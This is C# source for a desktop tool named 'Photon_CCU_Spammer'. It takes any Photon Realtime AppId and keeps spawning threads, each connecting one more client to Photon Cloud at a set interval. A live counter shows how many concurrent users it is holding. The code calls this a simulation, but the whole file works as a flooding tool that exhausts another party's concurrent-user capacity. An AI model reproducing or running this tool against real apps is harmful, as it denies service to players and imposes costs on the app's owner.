using System.Windows;
using System.Windows.Input;
using Photon.Realtime;

// To make the Old api able to work with this code (mostly because i cba doing photon. all the time)
using LoadBalancingClient = Photon.Realtime.RealtimeClient;
using RaiseEventOptions = Photon.Realtime.RaiseEventArgs;
using DebugLevel = Photon.Client.LogLevel;
using Hashtable = Photon.Client.PhotonHashtable;

namespace Photon_CCU_Spammer
{
    public partial class MainWindow : Window
    {
        private volatile bool stopFlag = false;
        private List<Thread> clientThreads = new List<Thread>();
        private int connectedClients = 0;

        public MainWindow()
        {
            InitializeComponent();
        }

        #region Window Controls
        private void CloseButton_Click(object sender, RoutedEventArgs e) => this.Close();
        private void MinimizeButton_Click(object sender, RoutedEventArgs e) => this.WindowState = WindowState.Minimized;
        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed) this.DragMove();
        }
        #endregion

        #region Logging & CCU
        private void Log(string message)
        {
            Dispatcher.Invoke(() =>
            {
                LogBox.Items.Add(message);
                LogBox.ScrollIntoView(message);
            });
        }

        private void UpdateCCU(int delta)
        {
            Dispatcher.Invoke(() =>
            {
                connectedClients += delta;
                if (connectedClients < 0) connectedClients = 0; // safety check
                CCULabel.Text = connectedClients.ToString();
            });
        }
        #endregion

        #region Simulation Control
        private void StartButton_Click(object sender, RoutedEventArgs e)
        {
            stopFlag = false;

            string appId = RealtimeAppIdBox.Text.Trim();
            int spawnInterval = 500;

            if (!int.TryParse(SpawnIntervalBox.Text.Trim(), out spawnInterval))
                spawnInterval = 500;

            Thread simulationThread = new Thread(() => RunSimulation(appId, spawnInterval));
            simulationThread.IsBackground = true;
            simulationThread.Start();
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            stopFlag = true;
            Log("Stopping simulation...");
        }

        private void RunSimulation(string appId, int spawnInterval)
        {
            int clientId = 0;
            while (!stopFlag)
            {
                Thread t = new Thread(() => SimulateClient(appId, clientId));
                t.IsBackground = true;
                t.Start();
                clientThreads.Add(t);
                clientId++;
                Thread.Sleep(spawnInterval);
            }
        }
        #endregion

        #region Client Simulation
        private void SimulateClient(string appId, int clientId)
        {
            try
            {
                var settings = new AppSettings
                {
                    AppIdRealtime = appId,
                    AppVersion = "1.0",
                    FixedRegion = "us"
                };

                LoadBalancingClient client = new LoadBalancingClient();
                var listener = new ClientListener(Log, UpdateCCU, clientId);
                client.AddCallbackTarget(listener);
                client.ConnectUsingSettings(settings);

                while (!stopFlag && client.State != ClientState.Disconnected)
                {
                    client.Service();
                    Thread.Sleep(50);
                }

                client.Disconnect();

                if (listener.CountedInCCU)
                    Log($"[{clientId}] Disconnected");
                else
                    Log($"[{clientId}] Connection failed (not counted in CCU)");
            }
            catch (Exception ex)
            {
                Log($"[{clientId}] Error: {ex.Message}");
            }
        }
        #endregion

        #region Client Listener
        private class ClientListener : IConnectionCallbacks
        {
            private Action<string> _log;
            private Action<int> _updateCCU;
            private int _clientId;
            private bool _countedInCCU = false;

            public ClientListener(Action<string> logAction, Action<int> updateCCUAction, int clientId)
            {
                _log = logAction;
                _updateCCU = updateCCUAction;
                _clientId = clientId;
            }

            public bool CountedInCCU => _countedInCCU;

            public void OnConnected()
            {
                _log($"[{_clientId}] Connected to Photon Cloud");
            }

            public void OnConnectedToMaster()
            {
                _log($"[{_clientId}] Connected to Master Server");
                _countedInCCU = true;
                _updateCCU(1);
            }

            public void OnDisconnected(DisconnectCause cause)
            {
                _log($"[{_clientId}] Disconnected: {cause}");
                if (_countedInCCU)
                    _updateCCU(-1);
            }

            public void OnRegionListReceived(RegionHandler regionHandler) { }
            public void OnCustomAuthenticationResponse(Dictionary<string, object> data) { }
            public void OnCustomAuthenticationFailed(string debugMessage) { }
        }
        #endregion
    }
}